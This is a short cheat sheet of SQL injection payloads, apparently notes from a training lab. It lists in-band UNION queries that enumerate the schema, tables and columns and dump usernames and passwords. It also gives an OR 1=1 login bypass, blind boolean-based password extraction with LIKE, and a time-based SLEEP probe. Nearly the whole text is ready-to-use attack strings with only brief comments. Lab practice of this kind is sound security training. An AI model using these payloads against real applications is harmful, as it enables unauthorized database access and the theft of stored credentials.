--In Band
-- use ' or " to get sql error 
--Number of columns
0 UNION SELECT 1,2,3
--Schema name
0 UNION SELECT 1,2,database()
--list of tables
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
--list of columns
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
--List iformation from column 
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

--Blind Authentication bypass
--Inital select * from users where username='%username%' and password='%password%' LIMIT 1;
--Final
select * from users where username='' and password='' OR 1=1;

--Blind Boolean Based
--Initial select * from users where username = '%username%' LIMIT 1;
--Get number of columns
admin123' UNION SELECT 1,2,3;
'
--Get schema name
admin123' UNION SELECT 1,2,3 where database() like 's%';--
'
--Get password
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

--Time Base
admin123' UNION SELECT SLEEP(5),2;--